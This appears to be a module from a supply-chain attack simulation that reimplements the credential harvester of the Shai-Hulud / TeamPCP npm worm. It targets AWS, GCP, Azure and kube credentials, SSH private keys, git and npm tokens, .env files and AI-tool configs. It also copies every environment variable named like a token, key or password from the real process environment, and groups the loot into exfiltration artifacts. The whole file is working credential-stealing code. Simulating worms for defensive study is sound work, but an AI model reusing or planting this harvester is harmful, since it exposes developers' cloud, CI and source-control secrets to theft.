// supply-chain-sim/npm-package/lib/harvest.js
// Shai-Hulud / TeamPCP credential harvester: targeted reads of the exact dev/cloud/CI secret
// files the worm goes after, plus a filtered dump of process environment variables. TruffleHog
// scanning + validation is a separate stage (see bun_environment.js).
const fs = require('node:fs');
const path = require('node:path');

const ARTIFACT_NAMES = ['cloud.json', 'contents.json', 'environment.json', 'truffleSecrets.json'];

// Exact paths Shai-Hulud / TeamPCP target, grouped into the exfil artifacts they map to.
const TARGETS = {
  cloud: ['.aws/credentials', '.aws/config', '.config/gcloud/application_default_credentials.json',
    '.azure/accessTokens.json', '.kube/config'],
  contents: ['.ssh/id_rsa', '.ssh/id_ed25519', '.ssh/known_hosts', '.git-credentials',
    '.docker/config.json', '.npmrc', '.env', '.claude.json', '.config/mcp.json'],
};

// Environment variables the worm scans for (token/key/secret material).
const ENV_SECRET_RE = /(_TOKEN|TOKEN_|^TOKEN$|_KEY$|KEY_|_SECRET|SECRET_|PASSWORD|PASSWD|_PAT$|NPM_|AWS_|GITHUB_|^GH_|AZURE_|GCP_|GOOGLE_|CLOUDSDK_|DOCKER_|NODE_AUTH)/i;

function readOrNull(root, rel) {
  try { return fs.readFileSync(path.join(root, rel), 'utf8'); } catch { return null; }
}

function harvestEnv(env = process.env) {
  const out = {};
  for (const [k, v] of Object.entries(env)) if (ENV_SECRET_RE.test(k)) out[k] = v;
  return out;
}

function harvest(decoyRoot) {
  const out = { cloud: {}, contents: {}, environment: {}, truffleSecrets: {} };
  for (const [group, rels] of Object.entries(TARGETS)) {
    for (const rel of rels) out[group][rel] = readOrNull(decoyRoot, rel);
  }
  out.environment = harvestEnv();                       // real env-var theft -> environment.json
  // truffleSecrets is filled by the TruffleHog stage; until then, record which decoys had content.
  out.truffleSecrets = { found: [...Object.entries(out.cloud), ...Object.entries(out.contents)]
    .filter(([, v]) => typeof v === 'string' && v).map(([k]) => k) };
  return out;
}

module.exports = { harvest, harvestEnv, ARTIFACT_NAMES, TARGETS };
